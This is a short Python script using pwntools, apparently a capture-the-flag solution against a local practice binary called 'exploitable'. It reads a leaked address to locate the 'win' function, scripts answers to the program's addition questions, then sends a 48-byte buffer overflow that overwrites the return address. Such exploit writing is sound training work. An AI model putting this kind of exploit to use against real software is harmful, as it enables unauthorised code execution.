from pwn import *
import re

proc = process("./exploitable")
e = ELF("./exploitable")
win_addr = int(proc.recvline().split(b"@")[1].strip()) - e.sym["play_game"] + e.sym["win"]

proc.recvline()

# answer questions
while True:
	line = proc.recvline()
	if b"What is" not in line:
		break

	match = re.match(b"What is (\d+) \+ (\d+)\?", line)
	num_1 = int(match.group(1))
	num_2 = int(match.group(2))

	proc.sendline(str(num_1 + num_2))

proc.sendline(48 * b"A" + p32(win_addr))

proc.interactive()